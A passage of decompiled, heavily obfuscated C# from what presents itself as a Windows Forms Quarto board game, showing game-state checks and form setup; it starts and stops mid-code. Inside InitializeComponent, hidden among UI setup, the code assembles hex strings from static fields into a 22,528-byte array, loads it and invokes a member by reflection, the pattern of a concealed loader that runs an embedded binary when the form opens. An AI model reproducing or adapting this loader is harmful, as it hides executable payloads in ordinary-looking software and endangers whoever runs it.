					num = (int)((num2 * 1968257606) ^ 0x72D2B658);
					continue;
				case 49u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = (int)(num2 * 1357065382) ^ -2129117620;
						continue;
					}
					goto IL_0296;
				case 48u:
				{
					int num6;
					int num7;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num6 = -1499092063;
						num7 = -1499092063;
					}
					else
					{
						num6 = -1365125466;
						num7 = -1365125466;
					}
					num = num6 ^ ((int)num2 * -1614370059);
					continue;
				}
				case 47u:
					if (mem[3, 0] != null)
					{
						num = (int)((num2 * 625141953) ^ 0x54FAA9F8);
						continue;
					}
					goto IL_007d;
				case 46u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = (int)(num2 * 308338544) ^ -982812301;
						continue;
					}
					goto IL_02a2;
				case 45u:
				{
					int num62;
					if (mem[num3, 0].Point == mem[num3, 1].Point)
					{
						num = 1873020507;
						num62 = 1873020507;
					}
					else
					{
						num = 1148023525;
						num62 = 1148023525;
					}
					continue;
				}
				case 44u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -2075468965) ^ -2070291000;
						continue;
					}
					goto IL_007d;
				case 43u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = ((int)num2 * -1554628945) ^ 0x515BF3E0;
						continue;
					}
					goto IL_02a2;
				case 42u:
				{
					int num57;
					if (mem[num3, 0] == null)
					{
						num = 1575242148;
						num57 = 1575242148;
					}
					else
					{
						num = 1670712631;
						num57 = 1670712631;
					}
					continue;
				}
				case 41u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = 989281146;
						continue;
					}
					goto IL_0296;
				case 40u:
					num = (int)((num2 * 1683733873) ^ 0x6591CE82);
					continue;
				case 39u:
				{
					int num47;
					int num48;
					if (mem[1, 1] != null)
					{
						num47 = -1638902069;
						num48 = -1638902069;
					}
					else
					{
						num47 = -245273727;
						num48 = -245273727;
					}
					num = num47 ^ (int)(num2 * 987427711);
					continue;
				}
				case 38u:
				{
					int num37;
					int num38;
					if (mem[num3, 2] == null)
					{
						num37 = 1556084118;
						num38 = 1556084118;
					}
					else
					{
						num37 = 260268283;
						num38 = 260268283;
					}
					num = num37 ^ ((int)num2 * -1457618807);
					continue;
				}
				case 37u:
				{
					int num30;
					int num31;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num30 = 1966873861;
						num31 = 1966873861;
					}
					else
					{
						num30 = 1520288686;
						num31 = 1520288686;
					}
					num = num30 ^ ((int)num2 * -1400060021);
					continue;
				}
				case 36u:
					if (mem[1, num3] != null)
					{
						num = ((int)num2 * -985888109) ^ -1147642243;
						continue;
					}
					goto IL_0296;
				case 35u:
				{
					int num23;
					int num24;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num23 = 795111094;
						num24 = 795111094;
					}
					else
					{
						num23 = 504130543;
						num24 = 504130543;
					}
					num = num23 ^ ((int)num2 * -870043291);
					continue;
				}
				case 34u:
				{
					int num19;
					int num20;
					if (mem[num3, 1].Point == mem[num3, 2].Point)
					{
						num19 = 1601015679;
						num20 = 1601015679;
					}
					else
					{
						num19 = 1109422377;
						num20 = 1109422377;
					}
					num = num19 ^ (int)(num2 * 1979639911);
					continue;
				}
				case 33u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)(num2 * 1842607070) ^ -978248734;
						continue;
					}
					goto IL_0071;
				case 32u:
					num3++;
					num = (int)((num2 * 604662979) ^ 0x2032BDFA);
					continue;
				case 31u:
				{
					int num11;
					int num12;
					if (mem[num3, 1].Big == mem[num3, 2].Big)
					{
						num11 = -643255901;
						num12 = -643255901;
					}
					else
					{
						num11 = -564698675;
						num12 = -564698675;
					}
					num = num11 ^ ((int)num2 * -1444922943);
					continue;
				}
				case 30u:
					if (mem[0, num3] != null)
					{
						num = 856646909;
						continue;
					}
					goto IL_0296;
				case 29u:
				{
					int num66;
					int num67;
					if (mem[2, 2] != null)
					{
						num66 = 41807214;
						num67 = 41807214;
					}
					else
					{
						num66 = 190941845;
						num67 = 190941845;
					}
					num = num66 ^ ((int)num2 * -2136956909);
					continue;
				}
				case 28u:
					if (mem[2, num3] != null)
					{
						num = (int)((num2 * 412359441) ^ 0x4AAE44C7);
						continue;
					}
					goto IL_0296;
				case 27u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -1954934168) ^ -914681179;
						continue;
					}
					goto IL_0071;
				case 26u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = (int)((num2 * 632132585) ^ 0x7D55FCE);
						continue;
					}
					goto IL_02a2;
				case 25u:
				{
					int num60;
					int num61;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num60 = 1355188064;
						num61 = 1355188064;
					}
					else
					{
						num60 = 1301990060;
						num61 = 1301990060;
					}
					num = num60 ^ ((int)num2 * -1340182200);
					continue;
				}
				case 24u:
				{
					int num58;
					int num59;
					if (mem[0, 0] == null)
					{
						num58 = 805518490;
						num59 = 805518490;
					}
					else
					{
						num58 = 1987411692;
						num59 = 1987411692;
					}
					num = num58 ^ ((int)num2 * -991545201);
					continue;
				}
				case 23u:
				{
					int num53;
					int num54;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num53 = -220993549;
						num54 = -220993549;
					}
					else
					{
						num53 = -1173928091;
						num54 = -1173928091;
					}
					num = num53 ^ (int)(num2 * 1835465265);
					continue;
				}
				case 22u:
					if (mem[3, num3] != null)
					{
						num = (int)((num2 * 1080013365) ^ 0x2D87320B);
						continue;
					}
					goto IL_0296;
				case 21u:
				{
					int num49;
					int num50;
					if (mem[num3, 1].Dark != mem[num3, 2].Dark)
					{
						num49 = -1294922463;
						num50 = -1294922463;
					}
					else
					{
						num49 = -1822539387;
						num50 = -1822539387;
					}
					num = num49 ^ ((int)num2 * -274325812);
					continue;
				}
				case 20u:
				{
					int num44;
					int num45;
					if (mem[num3, 1].Square == mem[num3, 2].Square)
					{
						num44 = 1959190630;
						num45 = 1959190630;
					}
					else
					{
						num44 = 1093573425;
						num45 = 1093573425;
					}
					num = num44 ^ ((int)num2 * -1965300795);
					continue;
				}
				case 19u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = (int)(num2 * 1941523455) ^ -484107871;
						continue;
					}
					goto IL_02a2;
				case 18u:
					flag = true;
					num = (int)(num2 * 468905730) ^ -257449137;
					continue;
				case 17u:
				{
					int num41;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = 1359557853;
						num41 = 1359557853;
					}
					else
					{
						num = 1417072709;
						num41 = 1417072709;
					}
					continue;
				}
				case 16u:
				{
					int num33;
					int num34;
					if (mem[0, num3].Big == mem[1, num3].Big)
					{
						num33 = 1630199560;
						num34 = 1630199560;
					}
					else
					{
						num33 = 1587131714;
						num34 = 1587131714;
					}
					num = num33 ^ ((int)num2 * -232082360);
					continue;
				}
				case 15u:
				{
					int num28;
					int num29;
					if (mem[1, num3].Point == mem[2, num3].Point)
					{
						num28 = -511121955;
						num29 = -511121955;
					}
					else
					{
						num28 = -56737380;
						num29 = -56737380;
					}
					num = num28 ^ ((int)num2 * -891684446);
					continue;
				}
				case 14u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)((num2 * 1841936980) ^ 0x27E5F2DA);
						continue;
					}
					goto IL_0071;
				case 13u:
				{
					int num27;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = 417689899;
						num27 = 417689899;
					}
					else
					{
						num = 329638178;
						num27 = 329638178;
					}
					continue;
				}
				case 12u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1000340427) ^ 0x41F1EB1B;
						continue;
					}
					goto IL_0071;
				case 11u:
				{
					int num21;
					int num22;
					if (!flag2)
					{
						num21 = 292239542;
						num22 = 292239542;
					}
					else
					{
						num21 = 1926716494;
						num22 = 1926716494;
					}
					num = num21 ^ ((int)num2 * -2017307690);
					continue;
				}
				case 10u:
					num = 380591084;
					continue;
				case 9u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -592924605) ^ -1478033486;
						continue;
					}
					goto IL_0071;
				case 8u:
					flag2 = num3 < 4;
					num = 1264839335;
					continue;
				case 7u:
					if (mem[0, 3] != null)
					{
						num = 468058980;
						continue;
					}
					goto IL_007d;
				case 6u:
				{
					int num16;
					int num17;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num16 = -1107714427;
						num17 = -1107714427;
					}
					else
					{
						num16 = -1432490030;
						num17 = -1432490030;
					}
					num = num16 ^ ((int)num2 * -234234875);
					continue;
				}
				case 5u:
				{
					int num15;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 1666651599;
						num15 = 1666651599;
					}
					else
					{
						num = 96140288;
						num15 = 96140288;
					}
					continue;
				}
				case 4u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = (int)(num2 * 1225943855) ^ -447618569;
						continue;
					}
					goto IL_02a2;
				case 1u:
				{
					int num8;
					if (mem[num3, 0].Square == mem[num3, 1].Square)
					{
						num = 217807006;
						num8 = 217807006;
					}
					else
					{
						num = 1575242148;
						num8 = 1575242148;
					}
					continue;
				}
				case 0u:
				{
					int num4;
					int num5;
					if (mem[1, num3].Dark != mem[2, num3].Dark)
					{
						num4 = 937002839;
						num5 = 937002839;
					}
					else
					{
						num4 = 1528617111;
						num5 = 1528617111;
					}
					num = num4 ^ ((int)num2 * -685756681);
					continue;
				}
				case 3u:
					break;
				default:
					{
						return result;
					}
					IL_0296:
					num = 1125044906;
					num18 = 1125044906;
					continue;
					IL_02a2:
					num = 1550342022;
					num18 = 1550342022;
					continue;
					IL_0071:
					num = 1264482448;
					num56 = 1264482448;
					continue;
					IL_007d:
					num = 234500465;
					num56 = 234500465;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		bool flag3 = default(bool);
		int num6 = default(int);
		int num5 = default(int);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 841917239;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7BBEED2Cu) % 15u)
				{
				case 13u:
					flag3 = num6 < 4;
					num = 121673624;
					continue;
				case 12u:
					num6 = 0;
					num = 1860917210;
					continue;
				case 11u:
				{
					int num9;
					if (num5 >= 4)
					{
						num = 468528670;
						num9 = 468528670;
					}
					else
					{
						num = 866204072;
						num9 = 866204072;
					}
					continue;
				}
				case 10u:
					flag2 = mem[num5, num6] == null;
					num = 552967908;
					continue;
				case 9u:
					num5++;
					num = (int)((num2 * 1621885109) ^ 0x3A0BD477);
					continue;
				case 8u:
					num = (int)(num2 * 180372846) ^ -1932544807;
					continue;
				case 7u:
					num5 = 0;
					num = ((int)num2 * -1528569703) ^ -337359582;
					continue;
				case 5u:
				{
					int num7;
					int num8;
					if (flag3)
					{
						num7 = -1872536400;
						num8 = -1872536400;
					}
					else
					{
						num7 = -661715236;
						num8 = -661715236;
					}
					num = num7 ^ ((int)num2 * -1634523614);
					continue;
				}
				case 4u:
					result = flag;
					num = ((int)num2 * -719068886) ^ -953754319;
					continue;
				case 3u:
					num6++;
					num = 1860917210;
					continue;
				case 2u:
					num = (int)((num2 * 716529043) ^ 0x2622C4B0);
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (flag2)
					{
						num3 = 1136057606;
						num4 = 1136057606;
					}
					else
					{
						num3 = 937285437;
						num4 = 937285437;
					}
					num = num3 ^ ((int)num2 * -1105621233);
					continue;
				}
				case 0u:
					flag = false;
					num = (int)((num2 * 1053686123) ^ 0x38549883);
					continue;
				case 14u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = -1279968033;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA9446ADDu) % 8u)
				{
				case 7u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -158307295) ^ -1212737905;
					continue;
				case 6u:
					num = (int)((num2 * 641158703) ^ 0x1368D4C0);
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label1, "");
					num = (int)(num2 * 1311641594) ^ -637852604;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)((num2 * 2087902529) ^ 0x1385E8AE);
					continue;
				case 2u:
					num = ((int)num2 * -2142893404) ^ -1471407740;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label6, str);
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = (int)((num2 * 1838499518) ^ 0x54FB3E4D);
					continue;
				default:
					return;
				case 4u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -347944002;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0xC747BE1Fu) % 9u)
				{
				case 8u:
					num = ((int)num2 * -2107867081) ^ 0x77D3BB13;
					continue;
				case 6u:
					if (disposing)
					{
						num = (int)(num2 * 104906943) ^ -873447406;
						continue;
					}
					num5 = 0;
					goto IL_002b;
				case 4u:
					num = (int)((num2 * 523531811) ^ 0xD0B98);
					continue;
				case 3u:
					Form1.smethod_51((IDisposable)components);
					num = (int)((num2 * 1847794769) ^ 0x4EC7B1A3);
					continue;
				case 2u:
					num5 = ((components != null) ? 1 : 0);
					goto IL_002b;
				case 1u:
					num = ((int)num2 * -178755876) ^ 0x48482A8;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 718327851;
						num4 = 718327851;
					}
					else
					{
						num3 = 45977792;
						num4 = 45977792;
					}
					num = num3 ^ ((int)num2 * -764636299);
					continue;
				}
				case 5u:
					break;
				default:
					{
						((Form)this).Dispose(disposing);
						return;
					}
					IL_002b:
					flag = (byte)num5 != 0;
					num = -454222732;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0e5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e68: Expected O, but got Unknown
		int num3 = default(int);
		bool flag = default(bool);
		object[] object_ = default(object[]);
		string string_ = default(string);
		byte[] array = default(byte[]);
		while (true)
		{
			int num = 1551814487;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x54C1E0D6u) % 132u)
				{
				case 131u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)((num2 * 889572113) ^ 0x3FE9D5FD);
					continue;
				case 130u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -652456918) ^ -1938574885;
					continue;
				case 129u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)((num2 * 1469841848) ^ 0x4774C7A0);
					continue;
				case 128u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1172705512) ^ -2014327428;
					continue;
				case 126u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)(num2 * 1797084269) ^ -438640467;
					continue;
				case 125u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)(num2 * 505131728) ^ -1484424384;
					continue;
				case 124u:
					num3++;
					num = (int)((num2 * 715482963) ^ 0xC43E685);
					continue;
				case 123u:
					Form1.smethod_61((Control)(object)label6, "label6");
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 1616760673) ^ 0x708B1262);
					continue;
				case 122u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)((num2 * 1559988435) ^ 0x28E1571A);
					continue;
				case 121u:
					num = (int)(num2 * 2124402056) ^ -1286557003;
					continue;
				case 120u:
					timer1 = Form1.smethod_56(components);
					num = ((int)num2 * -75316680) ^ -262279842;
					continue;
				case 119u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -2097375180) ^ 0x31986A04;
					continue;
				case 118u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -1215181023;
						num5 = -1215181023;
					}
					else
					{
						num4 = -943275967;
						num5 = -943275967;
					}
					num = num4 ^ ((int)num2 * -1085200119);
					continue;
				}
				case 116u:
					num = ((int)num2 * -496421338) ^ 0x2A56DA66;
					continue;
				case 115u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 1729782484) ^ 0x4012668B);
					continue;
				case 114u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					Form1.smethod_32((Control)(object)richTextBox1, "");
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = (int)((num2 * 743067083) ^ 0x3820AF1F);
					continue;
				case 113u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -1194132078) ^ -578191069;
					continue;
				case 112u:
					num = ((int)num2 * -2035526332) ^ 0x5CCF0CB2;
					continue;
				case 111u:
					richTextBox1 = Form1.smethod_54();
					panel1 = Form1.smethod_55();
					num = ((int)num2 * -1148768905) ^ 0x21616737;
					continue;
				case 110u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1607741560) ^ -380229429;
					continue;
				case 109u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)((num2 * 757273121) ^ 0x4F75C221);
					continue;
				case 108u:
					num = (int)((num2 * 8400375) ^ 0x96D5FFB);
					continue;
				case 107u:
					flag = num3 < 22528;
					num = 1735056124;
					continue;
				case 106u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -2069567044) ^ 0x25976161;
					continue;
				case 105u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -687505822) ^ -1912337504;
					continue;
				case 104u:
					num = ((int)num2 * -384491062) ^ 0x784BF207;
					continue;
				case 103u:
					num = (int)(num2 * 1128650505) ^ -228887973;
					continue;
				case 102u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -947688744) ^ -2058296119;
					continue;
				case 101u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -1789203508) ^ -2025848469;
					continue;
				case 100u:
					num = (int)(num2 * 166924287) ^ -1220446144;
					continue;
				case 99u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1066180828) ^ -1823377288;
					continue;
				case 98u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)(num2 * 423767053) ^ -1096406505;
					continue;
				case 97u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1410741894) ^ 0x61F42C3C;
					continue;
				case 96u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = (int)((num2 * 1880144400) ^ 0x6199E3EA);
					continue;
				case 95u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -1037435821) ^ 0x53F2FCBE;
					continue;
				case 94u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)((num2 * 125801956) ^ 0x344DE627);
					continue;
				case 93u:
					components = Form1.smethod_52();
					num = ((int)num2 * -222823552) ^ -1986150157;
					continue;
				case 92u:
					Form1.smethod_70(ComMember, object_);
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -2103272305) ^ -917362557;
					continue;
				case 91u:
					num = (int)(num2 * 1324125908) ^ -596620808;
					continue;
				case 90u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 952104198) ^ 0x58672550);
					continue;
				case 89u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = ((int)num2 * -1595175803) ^ 0x47564F24;
					continue;
				case 88u:
					num = (int)(num2 * 1143218585) ^ -1180307323;
					continue;
				case 87u:
					num = ((int)num2 * -1441198157) ^ -2094878314;
					continue;
				case 86u:
					num = (int)(num2 * 734509123) ^ -1976444962;
					continue;
				case 85u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -129919582) ^ -1356023446;
					continue;
				case 84u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -1505112260) ^ 0x5FFA5495;
					continue;
				case 83u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)(num2 * 1303784926) ^ -98918490;
					continue;
				case 82u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)((num2 * 675441163) ^ 0x1DFE9C80);
					continue;
				case 81u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)(num2 * 218625924) ^ -641507484;
					continue;
				case 80u:
					num = ((int)num2 * -808048555) ^ -872595362;
					continue;
				case 79u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -129679920) ^ -1953415483;
					continue;
				case 78u:
					button1 = Form1.smethod_53();
					num = (int)(num2 * 372829823) ^ -845486505;
					continue;
				case 77u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -1058416813) ^ -1572656879;
					continue;
				case 76u:
					label5 = Form1.smethod_57();
					num = (int)((num2 * 1316065744) ^ 0x6BCA5D2E);
					continue;
				case 75u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -2052694591) ^ 0x180E86BB;
					continue;
				case 74u:
					Form1.smethod_72(timer1, 1000);
					num = (int)((num2 * 1332528389) ^ 0x3C2B13B);
					continue;
				case 73u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -1036505435) ^ 0x579983B7;
					continue;
				case 72u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -395248824) ^ 0x2E0B5050;
					continue;
				case 71u:
					num = (int)((num2 * 1567648275) ^ 0x2D25111D);
					continue;
				case 70u:
					num = (int)(num2 * 1820468977) ^ -957845868;
					continue;
				case 69u:
					num = (int)(num2 * 140990534) ^ -1903227458;
					continue;
				case 68u:
					Form1.smethod_61((Control)(object)label5, "label5");
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 1166377426) ^ 0x55BD1B03);
					continue;
				case 67u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					string_ = Veet.Sa;
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = (int)(num2 * 2068953292) ^ -971305340;
					continue;
				case 66u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -918583009) ^ 0x3CA491DF;
					continue;
				case 65u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)(num2 * 238771597) ^ -388685407;
					continue;
				case 64u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)((num2 * 1375252010) ^ 0x288B3067);
					continue;
				case 63u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)(num2 * 1772951943) ^ -1987092634;
					continue;
				case 62u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = (int)((num2 * 1937807369) ^ 0x2EE5D2AB);
					continue;
				case 61u:
					num = (int)((num2 * 1213828107) ^ 0x64E0043C);
					continue;
				case 60u:
					num = ((int)num2 * -1378319684) ^ 0x619D099B;
					continue;
				case 59u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1033166067) ^ -404991278;
					continue;
				case 58u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -510181620) ^ -1641256093;
					continue;
				case 57u:
					num = ((int)num2 * -164290320) ^ -991180173;
					continue;
				case 56u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)(num2 * 1718849678) ^ -3394315;
					continue;
				case 55u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = (int)((num2 * 240390593) ^ 0x18CA3196);
					continue;
				case 54u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 1690771905) ^ 0x115F7379);
					continue;
				case 53u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)((num2 * 804371734) ^ 0xDB1E5F1);
					continue;
				case 52u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					num = (int)(num2 * 1069151249) ^ -1038438910;
					continue;
				case 51u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 856316265) ^ -2108508579;
					continue;
				case 50u:
					num = (int)((num2 * 764651708) ^ 0x1F3F420D);
					continue;
				case 49u:
					num = (int)((num2 * 2014956510) ^ 0x76930A0F);
					continue;
				case 48u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)(num2 * 1576343903) ^ -153492170;
					continue;
				case 47u:
					num = ((int)num2 * -263796454) ^ -1125320323;
					continue;
				case 46u:
					num = ((int)num2 * -1664100351) ^ 0x1775337F;
					continue;
				case 45u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = 1143851586;
					continue;
				case 44u:
					num = (int)((num2 * 934281860) ^ 0x48B78078);
					continue;
				case 43u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 1682681991) ^ 0x4339EEF7);
					continue;
				case 42u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -1568292311) ^ 0x82B8468;
					continue;
				case 41u:
					num = (int)((num2 * 21012230) ^ 0x40888C2A);
					continue;
				case 40u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)((num2 * 1682035841) ^ 0x4416C55C);
					continue;
				case 39u:
					num = ((int)num2 * -295215330) ^ 0x52593893;
					continue;
				case 38u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -1730621745) ^ -1029183260;
					continue;
				case 37u:
					CharArray(array, string.Empty);
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -101301416) ^ -367598514;
					continue;
				case 36u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 1533074343) ^ -1921529390;
					continue;
				case 35u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)((num2 * 1191018613) ^ 0x38D7C0EA);
					continue;
				case 34u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -1034870996) ^ -1281070370;
					continue;
				case 33u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)(num2 * 996146664) ^ -479114506;
					continue;
				case 32u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 949151438) ^ 0x5F0454A9);
					continue;
				case 31u:
					num = (int)((num2 * 2055870599) ^ 0xB908889);
					continue;
				case 30u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)((num2 * 2134312295) ^ 0x38EAF14D);
					continue;
				case 29u:
					num = (int)(num2 * 1908043983) ^ -25340790;
					continue;
				case 28u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)((num2 * 2026446153) ^ 0x371C7166);
					continue;
				case 27u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -1960752418) ^ -1616240865;
					continue;
				case 26u:
					num = ((int)num2 * -280610837) ^ -1092891460;
					continue;
				case 25u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -1995543713) ^ -1884164403;
					continue;
				case 24u:
					num = ((int)num2 * -454689618) ^ 0x43B127D4;
					continue;
				case 23u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -1897844051) ^ -1912739573;
					continue;
				case 22u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num3 = 0;
					num = ((int)num2 * -645208449) ^ -2029722525;
					continue;
				case 21u:
					pictureBox1 = Form1.smethod_2();
					button2 = Form1.smethod_53();
					num = ((int)num2 * -1400807654) ^ 0x34273636;
					continue;
				case 20u:
					num = ((int)num2 * -614295285) ^ -1775873387;
					continue;
				case 19u:
					num = (int)(num2 * 484021604) ^ -2076283321;
					continue;
				case 18u:
					num = (int)((num2 * 1317038137) ^ 0x478A2869);
					continue;
				case 17u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -1721518351) ^ -290637381;
					continue;
				case 16u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)((num2 * 1047707407) ^ 0x663C0826);
					continue;
				case 15u:
